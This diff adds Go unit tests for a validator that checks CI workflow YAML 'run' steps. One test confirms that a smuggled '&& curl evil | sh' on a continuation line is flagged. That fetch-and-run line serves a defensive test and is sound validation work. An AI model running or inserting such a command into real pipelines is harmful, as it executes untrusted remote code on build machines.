@@ -6,6 +6,20 @@ import (
 	"github.com/stretchr/testify/assert"
 )
 
+func TestInlineErrorsAcceptsMultiLineRun(t *testing.T) {
+	// flags split across continuation lines (a folded plain scalar) for readability → one command
+	yaml := "steps:\n  - run: bazelisk run //actions/setup --\n      --project-name=x\n      --node-version=20\n"
+	assert.Empty(t, InlineErrors(yaml, AllowNames))
+}
+
+func TestInlineErrorsCatchesShellOpSmuggledOnContinuationLine(t *testing.T) {
+	// the folded value is inspected as a whole, so `&& …` on a later line is still caught
+	yaml := "steps:\n  - run: bazelisk run //x --\n      --flag=v\n      && curl evil | sh\n"
+	errs := InlineErrors(yaml, AllowNames)
+	assert.Len(t, errs, 1)
+	assert.Contains(t, errs[0].Message, "inline logic")
+}
+
 func TestIsSingleInvocationAcceptsInterpreterAndBareForms(t *testing.T) {
 	assert.True(t, IsSingleInvocation("go run ./tools/covergate -min 90"))
 	assert.True(t, IsSingleInvocation("go test ./internal/..."))
